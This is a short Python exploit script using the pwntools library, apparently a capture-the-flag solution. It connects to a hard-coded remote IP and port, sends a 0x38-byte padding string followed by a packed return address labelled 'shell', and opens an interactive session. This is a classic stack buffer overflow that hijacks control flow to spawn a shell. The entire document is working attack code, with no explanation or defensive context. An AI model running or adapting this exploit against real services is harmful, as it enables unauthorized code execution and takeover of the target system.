from pwn import *

shell = 0x4006b6
r = remote('140.110.112.77', 2118)
r.recvuntil(':)')
r.sendline('a' * 0x38 + p64(shell))
r.interactive()
